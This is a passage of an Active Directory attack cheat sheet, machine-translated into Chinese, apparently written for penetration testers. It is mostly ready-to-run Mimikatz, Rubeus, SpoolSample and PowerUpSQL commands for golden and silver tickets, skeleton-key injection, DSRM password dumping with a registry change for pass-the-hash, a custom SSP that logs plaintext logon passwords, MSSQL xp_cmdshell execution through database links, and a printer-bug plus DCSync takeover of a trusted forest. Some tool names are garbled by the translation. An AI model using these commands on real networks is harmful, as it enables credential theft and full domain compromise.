Invoke-Mimikatz -Command '"kerberos::golden /domain:<DomainName> /sid:<DomainSID> /target:<TheTargetMachine> /service:
<ServiceType> /rc4:<TheSPN's Account NTLM Hash> /user:<UserToImpersonate> /ptt"'
```

[SPN 列表](https://adsecurity.org/?page_id=183)

# 万能钥匙攻击

```
#Exploitation Command runned as DA:
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DC's FQDN>#Access using the password "mimikatz"
Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
```

# DSRM 滥用

*WUT 是 DIS？:每个 DC 都有一个本地管理员帐户，该帐户具有 DSRM 密码，即 SafeBackupPassword。我们可以得到它，然后 pth 它的 NTLM 散列来让本地管理员访问 DC！*

```
#Dump DSRM password (needs DA privs):
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <DC's Name>#This is a local account, so we can PTH and authenticate!
#BUT we need to alter the behaviour of the DSRM account before pth:
#Connect on DC:
Enter-PSSession -ComputerName <DC's Name>#Alter the Logon behaviour on registry:
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose#If the property already exists:
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose
```

然后只需 PTH 获得 DC 的本地管理权限！

# 自定义 SSP

*WUT 是 DIS？:我们可以在 SSP 上设置一个自定义 dll，例如 mimikatz 的 mimilib.dll，它将监视并捕获登录用户的明文密码！*

来自 powershell:

```
#Get current Security Package:
$packages = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' | select -ExpandProperty  'Security Packages'#Append mimilib:
$packages += "mimilib"#Change the new packages name
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' -Value $packages
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name 'Security Packages' -Value $packages#ALTERNATIVE:
Invoke-Mimikatz -Command '"misc::memssp"'
```

现在 DC 上的所有登录都记录到-> C:\ Windows \ System32 \ kiwissp . log

# 跨林攻击

# 信任票

*WUT 是 DIS？:如果我们在与另一个林有双向信任关系的域上拥有域管理员权限，我们就可以获得信任密钥并伪造我们自己的跨领域 TGT。*

⚠️:我们的访问权限将仅限于我们的 DA 帐户在另一个林中的配置权限！

使用 Mimikatz:

```
#Dump the trust key
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'#Forge an inter-realm TGT using the Golden Ticket attack
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<OurDomain> /sid:  
<OurDomainSID> /rc4:<TrustKey> /service:krbtgt /target:<TheTargetDomain> /ticket:
<PathToSaveTheGoldenTicket>"'
```

->❗门票。kirbi 格式

然后使用跨域 TGT 向外部森林请求 TGS 以获得任何服务，并访问资源！

使用红色:

```
.\Rubeus.exe asktgs /ticket:<kirbi file> /service:"Service's SPN" /ptt
```

# 滥用 MSSQL 服务器

*   枚举 MSSQL 实例:`Get-SQLInstanceDomain`
*   作为当前用户检查可访问性:

```
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

*   收集关于实例的信息:`Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`
*   滥用 SQL 数据库链接:
    *WUT 是 DIS？:数据库链接允许 SQL Server 像访问其他 SQL Server 一样访问其他资源。如果我们有两个链接的 SQL 服务器，我们可以在其中执行存储过程。数据库链接也适用于森林信任！*

检查现有的数据库链接:

```
#Check for existing Database Links:
#PowerUpSQL:
Get-SQLServerLink -Instace <SPN> -Verbose

#MSSQL Query:
select * from master..sysservers
```

然后，我们可以使用查询来枚举链接数据库中的其他链接:

```
#Manualy:
select * from openquery("LinkedDatabase", 'select * from master..sysservers')

#PowerUpSQL (Will Enum every link across Forests and Child Domain of the Forests):
Get-SQLServerLinkCrawl -Instance <SPN> -Verbose

#Then we can execute command on the machine's were the SQL Service runs using xp_cmdshell
#Or if it is disabled enable it:
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "SPN"
```

查询执行:

```
Get-SQLServerLinkCrawl -Instace <SPN> -Query "exec master..xp_cmdshell 'whoami'"
```

# 打破森林信任

*WUT 是 DIS？:
TL；
如果我们与一个外部森林有双向信任，并且我们设法危及本地森林上一台启用了无约束委派的机器(DC 默认有这个功能)，我们可以使用 printerbug 强制外部森林根域的 DC 向我们认证。然后，我们可以捕获它的 TGT，将其注入内存，并通过 DCsync 转储它的哈希值，这样我们就可以完全访问整个森林。*

我们将使用的工具:

*   [风疹](https://github.com/GhostPack/Rubeus)
*   [SpoolSample](https://github.com/leechristensen/SpoolSample)
*   [米米卡兹](https://github.com/gentilkiwi/mimikatz)

利用示例:

```
#Start monitoring for TGTs with rubeus:
Rubeus.exe monitor /interval:5 /filteruser:target-dc$#Execute the printerbug to trigger the force authentication of the target DC to our machine
SpoolSample.exe target-dc$.external.forest.local dc.compromised.domain.local#Get the base64 captured TGT from Rubeus and inject it into memory:
Rubeus.exe ptt /ticket:<Base64ValueofCapturedTicket>#Dump the hashes of the target domain using mimikatz:
lsadump::dcsync /domain:external.forest.local /all
```